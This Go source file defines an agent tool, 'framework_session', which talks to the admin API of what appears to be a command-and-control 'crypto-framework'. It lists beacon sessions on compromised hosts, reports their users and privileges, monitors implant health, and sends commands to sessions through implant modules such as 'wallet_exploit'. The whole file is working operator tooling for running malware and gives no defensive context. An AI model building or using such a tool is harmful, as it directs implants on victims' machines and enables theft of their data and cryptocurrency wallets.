package tool

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

// FrameworkSessionDefinition is the definition for the framework_session tool.
var FrameworkSessionDefinition = Definition{
	Name: "framework_session",
	Description: `Connect to live crypto-framework admin API for real-time session monitoring and task management.

Capabilities:
  - List active beacon sessions and their status
  - Monitor task execution and results in real-time
  - Query session metadata (OS, architecture, privileges)
  - Execute commands on active sessions
  - Retrieve task history and logs
  - Monitor implant health and connectivity

Admin API Endpoints:
  - GET /api/sessions - List all sessions
  - GET /api/sessions/{id} - Get session details
  - POST /api/sessions/{id}/tasks - Execute task
  - GET /api/sessions/{id}/tasks - Get task history
  - GET /api/sessions/{id}/logs - Get session logs
  - GET /api/health - Framework health status

Requires CRYPTOFRAMEWORK_API_SECRET in .env or environment.`,
	InputSchema: GenerateSchema[FrameworkSessionInput](),
	Function:    ExecuteFrameworkSession,
}

// FrameworkSessionInput is the input for the framework_session tool.
type FrameworkSessionInput struct {
	// Operation specifies what to do (list_sessions, session_info, execute_task, task_history, logs, health).
	Operation string `json:"operation" jsonschema:"description=Operation: list_sessions, session_info, execute_task, task_history, logs, health."`
	
	// SessionID targets a specific session (required for session-specific operations).
	SessionID string `json:"session_id,omitempty" jsonschema:"description=Session ID for session-specific operations."`
	
	// Command is the task to execute (required for execute_task operation).
	Command string `json:"command,omitempty" jsonschema:"description=Command to execute (for execute_task operation)."`
	
	// Module specifies the implant module to use for the task.
	Module string `json:"module,omitempty" jsonschema:"description=Implant module name (e.g., crypto, wallet_exploit, system)."`
	
	// AdminURL overrides the default admin API URL.
	AdminURL string `json:"admin_url,omitempty" jsonschema:"description=Admin API base URL. Defaults to http://127.0.0.1:8443."`
	
	// ApiSecret overrides the API secret from environment.
	ApiSecret string `json:"api_secret,omitempty" jsonschema:"description=API secret. Falls back to CRYPTOFRAMEWORK_API_SECRET env var."`
	
	// Timeout sets the request timeout in seconds.
	Timeout int `json:"timeout,omitempty" jsonschema:"description=Request timeout in seconds. Default: 30."`
	
	// Format controls output format (json, table, summary).
	Format string `json:"format,omitempty" jsonschema:"description=Output format: json, table, summary. Default: table."`
}

// SessionInfo contains information about an active session.
type SessionInfo struct {
	ID           string            `json:"id"`
	Status       string            `json:"status"`
	OS           string            `json:"os"`
	Architecture string            `json:"arch"`
	Hostname     string            `json:"hostname"`
	Username     string            `json:"username"`
	ProcessID    int               `json:"pid"`
	ProcessName  string            `json:"process_name"`
	Privileges   string            `json:"privileges"`
	LastSeen     string            `json:"last_seen"`
	FirstSeen    string            `json:"first_seen"`
	TasksTotal   int               `json:"tasks_total"`
	TasksPending int               `json:"tasks_pending"`
	Transport    string            `json:"transport"`
	RemoteIP     string            `json:"remote_ip"`
	Metadata     map[string]string `json:"metadata"`
}

// TaskInfo contains information about a task.
type TaskInfo struct {
	ID          string            `json:"id"`
	SessionID   string            `json:"session_id"`
	Module      string            `json:"module"`
	Command     string            `json:"command"`
	Status      string            `json:"status"`
	CreatedAt   string            `json:"created_at"`
	CompletedAt string            `json:"completed_at,omitempty"`
	Output      string            `json:"output,omitempty"`
	Error       string            `json:"error,omitempty"`
	Metadata    map[string]string `json:"metadata"`
}

// HealthStatus contains framework health information.
type HealthStatus struct {
	Status       string            `json:"status"`
	Version      string            `json:"version"`
	Uptime       string            `json:"uptime"`
	ActiveSessions int             `json:"active_sessions"`
	TotalSessions  int             `json:"total_sessions"`
	TasksExecuted  int             `json:"tasks_executed"`
	Listeners      []string          `json:"listeners"`
	Modules        []string          `json:"modules"`
	Resources      map[string]string `json:"resources"`
}

// ExecuteFrameworkSession connects to the live crypto-framework and executes operations.
func ExecuteFrameworkSession(input json.RawMessage) (string, error) {
	var args FrameworkSessionInput
	if err := json.Unmarshal(input, &args); err != nil {
		return "", err
	}
	
	if args.Operation == "" {
		return "", fmt.Errorf("operation is required: list_sessions, session_info, execute_task, task_history, logs, health")
	}
	
	// Set defaults
	adminURL := args.AdminURL
	if adminURL == "" {
		adminURL = "http://127.0.0.1:8443"
	}
	
	// Remove trailing slash
	adminURL = strings.TrimSuffix(adminURL, "/")
	
	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 30
	}
	
	format := args.Format
	if format == "" {
		format = "table"
	}
	
	// Get API secret
	apiSecret := args.ApiSecret
	if apiSecret == "" {
		apiSecret = os.Getenv("CRYPTOFRAMEWORK_API_SECRET")
		if apiSecret == "" {
			apiSecret = os.Getenv("VIRGA_AUTH_SECRET")
		}
	}
	
	if apiSecret == "" {
		return "", fmt.Errorf("API secret required. Set CRYPTOFRAMEWORK_API_SECRET env var or provide api_secret parameter")
	}
	
	// Create HTTP client
	client := &http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}
	
	// Execute operation
	switch args.Operation {
	case "list_sessions":
		return listSessions(client, adminURL, apiSecret, format)
	case "session_info":
		if args.SessionID == "" {
			return "", fmt.Errorf("session_id required for session_info operation")
		}
		return getSessionInfo(client, adminURL, apiSecret, args.SessionID, format)
	case "execute_task":
		if args.SessionID == "" || args.Command == "" {
			return "", fmt.Errorf("session_id and command required for execute_task operation")
		}
		return executeTask(client, adminURL, apiSecret, args.SessionID, args.Command, args.Module, format)
	case "task_history":
		if args.SessionID == "" {
			return "", fmt.Errorf("session_id required for task_history operation")
		}
		return getTaskHistory(client, adminURL, apiSecret, args.SessionID, format)
	case "logs":
		if args.SessionID == "" {
			return "", fmt.Errorf("session_id required for logs operation")
		}
		return getSessionLogs(client, adminURL, apiSecret, args.SessionID, format)
	case "health":
		return getFrameworkHealth(client, adminURL, apiSecret, format)
	default:
		return "", fmt.Errorf("unknown operation: %s", args.Operation)
	}
}

// listSessions retrieves all active sessions from the framework.
func listSessions(client *http.Client, adminURL, apiSecret, format string) (string, error) {
	req, err := http.NewRequest("GET", adminURL+"/api/sessions", nil)
	if err != nil {
		return "", err
	}
	
	req.Header.Set("Authorization", "Bearer "+apiSecret)
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	
	var sessions []SessionInfo
	if err := json.NewDecoder(resp.Body).Decode(&sessions); err != nil {
		return "", fmt.Errorf("failed to decode response: %w", err)
	}
	
	return formatSessionList(sessions, format), nil
}

// getSessionInfo retrieves detailed information about a specific session.
func getSessionInfo(client *http.Client, adminURL, apiSecret, sessionID, format string) (string, error) {
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/api/sessions/%s", adminURL, sessionID), nil)
	if err != nil {
		return "", err
	}
	
	req.Header.Set("Authorization", "Bearer "+apiSecret)
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	
	var session SessionInfo
	if err := json.NewDecoder(resp.Body).Decode(&session); err != nil {
		return "", fmt.Errorf("failed to decode response: %w", err)
	}
	
	return formatSessionInfo(session, format), nil
}

// executeTask executes a task on a specific session.
func executeTask(client *http.Client, adminURL, apiSecret, sessionID, command, module, format string) (string, error) {
	taskReq := map[string]interface{}{
		"command": command,
	}
	
	if module != "" {
		taskReq["module"] = module
	}
	
	reqBody, err := json.Marshal(taskReq)
	if err != nil {
		return "", err
	}
	
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/api/sessions/%s/tasks", adminURL, sessionID), bytes.NewBuffer(reqBody))
	if err != nil {
		return "", err
	}
	
	req.Header.Set("Authorization", "Bearer "+apiSecret)
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	
	var task TaskInfo
	if err := json.NewDecoder(resp.Body).Decode(&task); err != nil {
		return "", fmt.Errorf("failed to decode response: %w", err)
	}
	
	return formatTaskInfo(task, format), nil
}

// getTaskHistory retrieves task history for a session.
func getTaskHistory(client *http.Client, adminURL, apiSecret, sessionID, format string) (string, error) {
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/api/sessions/%s/tasks", adminURL, sessionID), nil)
	if err != nil {
		return "", err
	}
	
	req.Header.Set("Authorization", "Bearer "+apiSecret)
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	
	var tasks []TaskInfo
	if err := json.NewDecoder(resp.Body).Decode(&tasks); err != nil {
		return "", fmt.Errorf("failed to decode response: %w", err)
	}
	
	return formatTaskHistory(tasks, format), nil
}

// getSessionLogs retrieves logs for a session.
func getSessionLogs(client *http.Client, adminURL, apiSecret, sessionID, format string) (string, error) {
	req, err := http.NewRequest("GET", fmt.Sprintf("%s/api/sessions/%s/logs", adminURL, sessionID), nil)
	if err != nil {
		return "", err
	}
	
	req.Header.Set("Authorization", "Bearer "+apiSecret)
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	
	// Logs might be returned as plain text or structured JSON
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %w", err)
	}
	
	if format == "json" {
		return string(body), nil
	}
	
	return fmt.Sprintf("## Session Logs: %s\n\n```\n%s\n```", sessionID, string(body)), nil
}

// getFrameworkHealth retrieves overall framework health status.
func getFrameworkHealth(client *http.Client, adminURL, apiSecret, format string) (string, error) {
	req, err := http.NewRequest("GET", adminURL+"/api/health", nil)
	if err != nil {
		return "", err
	}
	
	req.Header.Set("Authorization", "Bearer "+apiSecret)
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("API error %d: %s", resp.StatusCode, string(body))
	}
	
	var health HealthStatus
	if err := json.NewDecoder(resp.Body).Decode(&health); err != nil {
		return "", fmt.Errorf("failed to decode response: %w", err)
	}
	
	return formatHealthStatus(health, format), nil
}

// Formatting functions

// formatSessionList formats a list of sessions.
func formatSessionList(sessions []SessionInfo, format string) string {
	if format == "json" {
		data, _ := json.MarshalIndent(sessions, "", "  ")
		return string(data)
	}
	
	if len(sessions) == 0 {
		return "No active sessions found."
	}
	
	if format == "summary" {
		return fmt.Sprintf("Found %d active sessions", len(sessions))
	}
	
	// Table format
	var sb strings.Builder
	fmt.Fprintf(&sb, "## Active Sessions (%d)\n\n", len(sessions))
	fmt.Fprintf(&sb, "| ID | Status | OS | Hostname | User | Last Seen | Tasks |\n")
	fmt.Fprintf(&sb, "|----|--------|----|---------|----|-----------|-------|\n")
	
	for _, session := range sessions {
		fmt.Fprintf(&sb, "| %s | %s | %s | %s | %s | %s | %d/%d |\n",
			session.ID[:8]+"...", session.Status, session.OS, session.Hostname,
			session.Username, session.LastSeen, session.TasksPending, session.TasksTotal)
	}
	
	return sb.String()
}

// formatSessionInfo formats detailed session information.
func formatSessionInfo(session SessionInfo, format string) string {
	if format == "json" {
		data, _ := json.MarshalIndent(session, "", "  ")
		return string(data)
	}
	
	var sb strings.Builder
	fmt.Fprintf(&sb, "## Session Details: %s\n\n", session.ID)
	fmt.Fprintf(&sb, "**Status:** %s\n", session.Status)
	fmt.Fprintf(&sb, "**System:** %s %s\n", session.OS, session.Architecture)
	fmt.Fprintf(&sb, "**Host:** %s\n", session.Hostname)
	fmt.Fprintf(&sb, "**User:** %s (%s)\n", session.Username, session.Privileges)
	fmt.Fprintf(&sb, "**Process:** %s (PID: %d)\n", session.ProcessName, session.ProcessID)
	fmt.Fprintf(&sb, "**Transport:** %s\n", session.Transport)
	fmt.Fprintf(&sb, "**Remote IP:** %s\n", session.RemoteIP)
	fmt.Fprintf(&sb, "**First Seen:** %s\n", session.FirstSeen)
	fmt.Fprintf(&sb, "**Last Seen:** %s\n", session.LastSeen)
	fmt.Fprintf(&sb, "**Tasks:** %d total, %d pending\n", session.TasksTotal, session.TasksPending)
	
	if len(session.Metadata) > 0 {
		fmt.Fprintf(&sb, "\n**Metadata:**\n")
		for key, value := range session.Metadata {
			fmt.Fprintf(&sb, "  - %s: %s\n", key, value)
		}
	}
	
	return sb.String()
}

// formatTaskInfo formats task execution results.
func formatTaskInfo(task TaskInfo, format string) string {
	if format == "json" {
		data, _ := json.MarshalIndent(task, "", "  ")
		return string(data)
	}
	
	var sb strings.Builder
	fmt.Fprintf(&sb, "## Task Executed\n\n")
	fmt.Fprintf(&sb, "**ID:** %s\n", task.ID)
	fmt.Fprintf(&sb, "**Session:** %s\n", task.SessionID)
	fmt.Fprintf(&sb, "**Command:** %s\n", task.Command)
	fmt.Fprintf(&sb, "**Module:** %s\n", task.Module)
	fmt.Fprintf(&sb, "**Status:** %s\n", task.Status)
	fmt.Fprintf(&sb, "**Created:** %s\n", task.CreatedAt)
	
	if task.CompletedAt != "" {
		fmt.Fprintf(&sb, "**Completed:** %s\n", task.CompletedAt)
	}
	
	if task.Output != "" {
		fmt.Fprintf(&sb, "\n**Output:**\n```\n%s\n```\n", task.Output)
	}
	
	if task.Error != "" {
		fmt.Fprintf(&sb, "\n**Error:**\n```\n%s\n```\n", task.Error)
	}
	
	return sb.String()
}

// formatTaskHistory formats task history.
func formatTaskHistory(tasks []TaskInfo, format string) string {
	if format == "json" {
		data, _ := json.MarshalIndent(tasks, "", "  ")
		return string(data)
	}
	
	if len(tasks) == 0 {
		return "No tasks found for this session."
	}
	
	var sb strings.Builder
	fmt.Fprintf(&sb, "## Task History (%d tasks)\n\n", len(tasks))
	fmt.Fprintf(&sb, "| ID | Module | Command | Status | Created | Completed |\n")
	fmt.Fprintf(&sb, "|----|--------|---------|--------|---------|----------|\n")
	
	for _, task := range tasks {
		completedAt := task.CompletedAt
		if completedAt == "" {
			completedAt = "Running..."
		}
		fmt.Fprintf(&sb, "| %s | %s | %s | %s | %s | %s |\n",
			task.ID[:8]+"...", task.Module, truncateString(task.Command, 20),
			task.Status, task.CreatedAt, completedAt)
	}
	
	return sb.String()
}

// formatHealthStatus formats framework health information.
func formatHealthStatus(health HealthStatus, format string) string {
	if format == "json" {
		data, _ := json.MarshalIndent(health, "", "  ")
		return string(data)
	}
	
	var sb strings.Builder
	fmt.Fprintf(&sb, "## Framework Health Status\n\n")
	fmt.Fprintf(&sb, "**Status:** %s\n", health.Status)
	fmt.Fprintf(&sb, "**Version:** %s\n", health.Version)
	fmt.Fprintf(&sb, "**Uptime:** %s\n", health.Uptime)
	fmt.Fprintf(&sb, "**Sessions:** %d active, %d total\n", health.ActiveSessions, health.TotalSessions)
	fmt.Fprintf(&sb, "**Tasks Executed:** %d\n", health.TasksExecuted)
	
	if len(health.Listeners) > 0 {
		fmt.Fprintf(&sb, "**Listeners:** %s\n", strings.Join(health.Listeners, ", "))
	}
	
	if len(health.Modules) > 0 {
		fmt.Fprintf(&sb, "**Available Modules:** %s\n", strings.Join(health.Modules, ", "))
	}
	
	if len(health.Resources) > 0 {
		fmt.Fprintf(&sb, "\n**Resources:**\n")
		for key, value := range health.Resources {
			fmt.Fprintf(&sb, "  - %s: %s\n", key, value)
		}
	}
	
	return sb.String()
}

// Helper functions

// truncateString truncates a string to a maximum length.
func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}